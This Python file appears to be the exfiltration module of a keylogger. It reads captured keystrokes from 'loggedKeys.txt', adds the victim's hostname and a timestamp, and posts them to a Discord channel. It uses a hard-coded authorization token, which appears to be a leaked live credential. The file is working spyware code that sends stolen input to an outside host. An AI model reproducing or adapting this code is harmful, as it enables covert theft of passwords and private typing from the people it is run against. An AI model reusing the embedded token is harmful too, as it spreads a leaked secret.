import datetime
import requests
import socket

class SendToDiscord:
        


    def __init__(self):
        self.loggedKeysTextFile = open("loggedKeys.txt", "r")
        self.contentsOfTextFile = self.loggedKeysTextFile.read()
        self.device = socket.gethostname()
        self.date = datetime.datetime.now()

    def sendToDiscord(self, loggedKeysTextFile):

        url = "https://discord.com/api/v9/channels/1394780057557532675/messages"
        payload = {
            "content" : self.contentsOfTextFile + "\n From: " + self.device + "\n Time: " + str(self.date)
        }
        header = {
            "Authorization" : "MTMxNjYwMDgxNzI5MzQ1OTU0NA.GSZsDE.GGlNDNwEF-Yx7flUATwUuaztt3v6ox-j-exsYE"
        }

        requests.post(url, payload, headers=header)
        loggedKeysTextFile.close()
